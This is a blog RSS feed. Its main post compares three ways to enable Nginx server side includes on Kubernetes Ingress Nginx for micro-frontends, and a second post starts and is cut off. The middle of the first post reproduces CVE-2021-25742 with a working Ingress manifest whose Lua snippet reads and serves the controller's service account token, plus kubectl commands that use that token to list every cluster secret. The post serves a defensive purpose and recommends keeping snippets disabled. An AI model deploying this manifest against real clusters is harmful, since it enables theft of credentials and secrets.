<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Ruben Rodriguez</title><link>https://ruben-rodriguez.github.io/posts/</link><description>Recent content in Posts on Ruben Rodriguez</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&lt;a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener"&gt;CC BY-NC 4.0&lt;/a&gt;</copyright><lastBuildDate>Wed, 07 Sep 2022 00:00:00 +0800</lastBuildDate><atom:link href="https://ruben-rodriguez.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Micro-frontends and Ingress Nginx - Server Side Includes</title><link>https://ruben-rodriguez.github.io/posts/ingress-nginx-server-side-includes/</link><pubDate>Wed, 07 Sep 2022 00:00:00 +0800</pubDate><guid>https://ruben-rodriguez.github.io/posts/ingress-nginx-server-side-includes/</guid><description>&lt;h2 id="context"&gt;Context&lt;/h2&gt;
&lt;p&gt;I was recently involved in the research of enabling SSI or server side includes at Ingress (Nginx) level. Citing the &lt;a href="https://en.wikipedia.org/wiki/Server_Side_Includes"&gt;Wikipedia definition&lt;/a&gt;, SSI is a simple interpreted server-side scripting language used almost exclusively for the World Wide Web. It is most useful for including the contents of one or more files into a web page on a web server, using its &lt;code&gt;#include&lt;/code&gt; directive.&lt;/p&gt;
&lt;p&gt;This was a very convenient way of adding the current date to web pages back in the old days:&lt;/p&gt;</description><content type="html"><![CDATA[<h2 id="context">Context</h2>
<p>I was recently involved in the research of enabling SSI or server side includes at Ingress (Nginx) level. Citing the <a href="https://en.wikipedia.org/wiki/Server_Side_Includes">Wikipedia definition</a>, SSI is a simple interpreted server-side scripting language used almost exclusively for the World Wide Web. It is most useful for including the contents of one or more files into a web page on a web server, using its <code>#include</code> directive.</p>
<p>This was a very convenient way of adding the current date to web pages back in the old days:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--#echo var=&#34;DATE_LOCAL&#34; --&gt;</span>
</span></span></code></pre></div><p>Nowadays, it is used mainly for implementing <a href="https://micro-frontends.org/">micro-frontends</a> architecture, which is basically to extend the concepts of micro services to the frontend development, dealing with the big frontend layers also called <code>Frontend Monoliths</code>. I won&rsquo;t dig deeper on what benefits can be obtained by following the micro-frontend architecture, the <a href="https://micro-frontends.org/">micro-frontends</a> webpage contains a lot of information and resources in that regard!</p>
<p>To illustrate the micro-frontend paradigm, follows an absurdly simple example of a web page that includes 2 sub-pages, <code>/alpha</code> and <code>/beta</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Hello World! Main page&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">h1</span>&gt;Hello World! Main page&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!--# set var=&#34;test&#34; value=&#34;Hello stranger! SSI is on!&#34; --&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!--# echo var=&#34;test&#34; --&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!--# include virtual=&#34;/alpha&#34; --&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!--# include virtual=&#34;/beta&#34; --&gt;</span>
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>Both <code>/alpha</code> and <code>/beta</code> child pages would be serving something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">h2</span>&gt;Hello World! SSI page X&lt;/<span style="color:#f92672">h2</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">p</span>&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>The resulting page would be something like this</p>
<p><img src="/img/posts/ingress-nginx-server-side-includes/page.png" alt=""></p>
<p>Now that we have this simple web page made up of 2 sub-pages, the challenge is how we can support it in modern infrastructure, Kubernetes, and in this case using one of the most used Ingress implementations: <a href="https://github.com/kubernetes/ingress-nginx">Ingress Nginx</a></p>
<p>Before moving forward to the different implementation options, you can find all the YAML files used on this article here: <a href="https://github.com/ruben-rodriguez/micro-frontends-in-k8s">micro-frontends-in-k8s</a></p>
<h2 id="the-good---ssi-behind-ingress">The Good - SSI behind Ingress</h2>
<p>The first approach is the most straight forward way of implementing a micro-frontend architecture in Kubernetes, independently of what Ingress implementation the cluster is using. The main idea is to have a web server (Nginx) service hosting the main page and with the server side includes configuration pointing to the other appropriate services running in the cluster and that make up the other parts of the page.</p>
<p><img src="/img/posts/ingress-nginx-server-side-includes/behind-ingress.png" alt=""></p>
<p>The tricky part here to make the thing work is the nginx configuration present in the main service, that contains the <code>ssi on;</code> parameter in the <code>server</code> block and that should perform a <code>proxy_pass</code> to the other services (the trailing <code>/</code> is important here) hosting the other parts of the web page in the <code>locations</code> that we need (<code>/alpha</code> and <code>/beta</code>):</p>
<pre tabindex="0"><code class="language-config" data-lang="config">user nginx;
worker_processes  auto;
events {
  worker_connections  1024;
}
http {
  keepalive_timeout  65;
  gzip  on;
  server {
    listen       80;
    server_name  localhost;
    ssi on;
    ssi_silent_errors off;
    proxy_set_header Accept-Encoding &#34;&#34;;
    proxy_intercept_errors on;
    proxy_ssl_server_name on;
    
    location / {
      root   /usr/share/nginx/html; #Change this line
      index  index.html index.htm;
    }
    location /alpha {
      proxy_pass http://alpha.default.svc.cluster.local/;
    }
    location /beta {
      proxy_pass http://beta.default.svc.cluster.local/;
    }
  }
}
</code></pre><h2 id="the-evil---ssi-at-ingress-level-with-server-snippets">The Evil - SSI at Ingress level with server-snippets</h2>
<p>The next option would be what many would consider the most easy to maintain. It involves enabling the server side includes (the <code>ssi on;</code> parameter present in the main service of the previous implementation) at the Ingress level, that is, in the Ingress object itself.</p>
<p><img src="/img/posts/ingress-nginx-server-side-includes/at-ingress.png" alt=""></p>
<p>It&rsquo;s technically possible to modify the Ingress Nginx host <a href="https://docs.nginx.com/nginx-ingress-controller/configuration/ingress-resources/advanced-configuration-with-snippets/">parameters</a> in the Ingress object definition through the <code>server-snippet</code> annotation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Ingress</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">annotations</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/rewrite-target</span>: <span style="color:#ae81ff">/$2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/server-snippet</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ssi on;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">micro-frontend</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">default</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ingressClassName</span>: <span style="color:#ae81ff">nginx</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rules</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">http</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">paths</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">backend</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">service</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">main</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">port</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">http</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">pathType</span>: <span style="color:#ae81ff">Prefix</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">backend</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">service</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">alpha</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">port</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">http</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/alpha(/|$)(.*)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">pathType</span>: <span style="color:#ae81ff">Prefix</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">backend</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">service</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">beta</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">port</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">http</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/beta(/|$)(.*)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">pathType</span>: <span style="color:#ae81ff">Prefix</span>
</span></span></code></pre></div><p>However, this requires to enable the Ingress controller <code>enable-snippets</code> argument which in turn, give access to NGINX configuration primitives and those primitives are not validated by the Ingress Controller. If you use the helm chart, you can enable the snippets by installing the controller with the value <code>controller.allowSnippetAnnotations=true</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  helm upgrade --install ingress-nginx ingress-nginx <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>          --repo https://kubernetes.github.io/ingress-nginx <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>          --namespace ingress-nginx --create-namespace <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>          --set controller.allowSnippetAnnotations<span style="color:#f92672">=</span>true
</span></span></code></pre></div><p>Turns out that enabling this option exposes the controller to <a href="https://github.com/kubernetes/ingress-nginx/issues/7837">CVE-2021-25742</a> that, in summary, allows retrieval of ingress-nginx service account token and secrets across all namespaces.</p>
<p>I took some of the resources from <a href="https://hackerone.com/reports/1249583">hackerone report</a> to reproduce the vulnerability:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Ingress</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">exploit-ingress</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">default</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">annotations</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/app-root</span>: <span style="color:#ae81ff">/token</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/server-snippet</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      set_by_lua $token &#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        local file = io.open(&#34;/run/secrets/kubernetes.io/serviceaccount/token&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        if not file then return nil end
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        local content = file:read &#34;*a&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        file:close()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        return content
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      location = /token {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        content_by_lua_block {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          ngx.say(ngx.var.token)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ingressClassName</span>: <span style="color:#ae81ff">nginx</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rules</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">http</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">paths</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">pathType</span>: <span style="color:#ae81ff">Prefix</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">backend</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">service</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">dummy-service</span>
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">port</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">name</span>: <span style="color:#ae81ff">http</span>
</span></span></code></pre></div><p>Accessing this Ingress would expose the service account token used by the ingress controller:</p>
<p><img src="/img/posts/ingress-nginx-server-side-includes/exploit.png" alt=""></p>
<p>One you obtain this token, you can verify that you are able to list (and fetch the contents) of all the cluster secrets:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  kubectl config set-credentials ingress-exploit <span style="color:#e6db74">&#34;--token=string-from-exploited-sa&#34;</span>
</span></span><span style="display:flex;"><span>λ  kubectl config set-context ingress-exploit --cluster<span style="color:#f92672">=</span>kind --user<span style="color:#f92672">=</span>ingress-exploit --namespace<span style="color:#f92672">=</span>default
</span></span><span style="display:flex;"><span>λ  kubectl config use-context ingress-exploit
</span></span><span style="display:flex;"><span>λ  kubectl get secrets -A
</span></span><span style="display:flex;"><span>NAMESPACE        NAME                                  TYPE                            DATA   AGE
</span></span><span style="display:flex;"><span>ingress-nginx    ingress-nginx-admission               Opaque                          <span style="color:#ae81ff">3</span>      20h
</span></span><span style="display:flex;"><span>ingress-nginx    sh.helm.release.v1.ingress-nginx.v1   helm.sh/release.v1              <span style="color:#ae81ff">1</span>      20h
</span></span><span style="display:flex;"><span>ingress-nginx    sh.helm.release.v1.ingress-nginx.v2   helm.sh/release.v1              <span style="color:#ae81ff">1</span>      20h
</span></span><span style="display:flex;"><span>kube-system      bootstrap-token-abcdef                bootstrap.kubernetes.io/token   <span style="color:#ae81ff">6</span>      20h
</span></span><span style="display:flex;"><span>metallb-system   memberlist                            Opaque                          <span style="color:#ae81ff">1</span>      20h
</span></span><span style="display:flex;"><span>metallb-system   webhook-server-cert                   Opaque                          <span style="color:#ae81ff">4</span>      20h
</span></span></code></pre></div><p>The mitigation is, basically, to leave the server-snippets disabled.</p>
<h2 id="the-ugly---ssi-at-ingress-with-custom-configuration">The Ugly - SSI at Ingress with custom configuration</h2>
<p>The last option I came up with is to enable the server side includes (<code>ssi on;</code> parameter) directly at configuration level:</p>
<p><img src="/img/posts/ingress-nginx-server-side-includes/config.png" alt=""></p>
<p>I call this ugly because it involves &ldquo;customizing&rdquo; the default configuration template; follows the partial output of the ConfigMap holding the customized template with the <code>ssi on;</code> directive inside the <code>http</code> block:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">ConfigMap</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">ingress-nginx-template</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">default</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">data</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">main-template</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{ $all := . }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{ $servers := .Servers }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{ $cfg := .Cfg }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{ $IsIPV6Enabled := .IsIPV6Enabled }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{ $healthzURI := .HealthzURI }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{ $backends := .Backends }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{ $proxyHeaders := .ProxySetHeaders }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{ $addHeaders := .AddHeaders }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    # Configuration checksum: {{ $all.Cfg.Checksum }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    # setup custom paths that do not require root access
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pid {{ .PID }};
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{ if $cfg.UseGeoIP2 }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    load_module /etc/nginx/modules/ngx_http_geoip2_module.so;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{ end }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ...
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    http {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ssi on;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        lua_package_path &#34;/etc/nginx/lua/?.lua;;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        {{ buildLuaSharedDictionaries $cfg $servers }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        init_by_lua_block {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            collectgarbage(&#34;collect&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            -- init modules
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            local ok, res
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ...</span>
</span></span></code></pre></div><p>You can retrieve the configuration template from a default Nginx Ingress controller installation, leveraging <code>kubectl cp</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  kubectl cp -n ingress-nginx ingress-nginx-controller-7bf78659d-qqknq:/etc/nginx/template/nginx.tmpl nginx.tmpl
</span></span></code></pre></div><p>After creating the ConfigMap, we can point the Ingress installation to it by setting the <code>controller.customTemplate</code> and <code>controller.customTemplate</code> values:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  helm upgrade --install ingress-nginx ingress-nginx <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>          --repo https://kubernetes.github.io/ingress-nginx <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>          --namespace ingress-nginx --create-namespace <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>          --set controller.customTemplate.configMapName<span style="color:#f92672">=</span>ingress-nginx-template <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>          --set controller.customTemplate.configMapKey<span style="color:#f92672">=</span>main-template
</span></span></code></pre></div><p>And that&rsquo;s it, the Ingress without the <code>server-snippet</code> annotation works just fine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Ingress</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">annotations</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/rewrite-target</span>: <span style="color:#ae81ff">/$2</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">micro-frontend</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">default</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ingressClassName</span>: <span style="color:#ae81ff">nginx</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rules</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">http</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">paths</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">backend</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">service</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">main</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">port</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">http</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">pathType</span>: <span style="color:#ae81ff">Prefix</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">backend</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">service</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">alpha</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">port</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">http</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/alpha(/|$)(.*)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">pathType</span>: <span style="color:#ae81ff">Prefix</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">backend</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">service</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">beta</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">port</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">http</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/beta(/|$)(.*)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">pathType</span>: <span style="color:#ae81ff">Prefix</span>
</span></span></code></pre></div><h2 id="conclusions">Conclusions</h2>
<ul>
<li>These were some quick ways to implement micro-frontend architectures in Kubernetes running Nginx Ingress controller.</li>
<li>In multi-tenancy platforms where different users are able to manage thier Ingress resources, enabling <code>server-snippets</code> might not be the best approach.</li>
<li>Maintaining a configuration file for the controller might introduce a risk that could break the whole Ingress controller in case of a misconfiguration.</li>
<li>Implementing the micro-frontend behind the Ingress controller seems to be the best approach.</li>
</ul>
<h2 id="related-links">Related links</h2>
<ul>
<li><a href="https://github.com/kubernetes/ingress-nginx">https://github.com/kubernetes/ingress-nginx</a></li>
<li><a href="https://kubernetes.github.io/ingress-nginx/examples/rewrite/">https://kubernetes.github.io/ingress-nginx/examples/rewrite/</a></li>
<li><a href="https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/custom-template/">https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/custom-template/</a></li>
</ul>
]]></content></item><item><title>Selfhosted S3 Terraform Backend using MinIO</title><link>https://ruben-rodriguez.github.io/posts/minio-s3-terraform-backend/</link><pubDate>Sat, 13 Aug 2022 00:00:00 +0800</pubDate><guid>https://ruben-rodriguez.github.io/posts/minio-s3-terraform-backend/</guid><description>&lt;h2 id="context"&gt;Context&lt;/h2&gt;
&lt;p&gt;In one of my homelab servers I make a heavy use of Docker containers (yes, plain Docker) to provide different tools and applications.
At this time, I was looking for a way of moving Terraform state files from the cloud to my home controlled infrastructure to reduce costs.
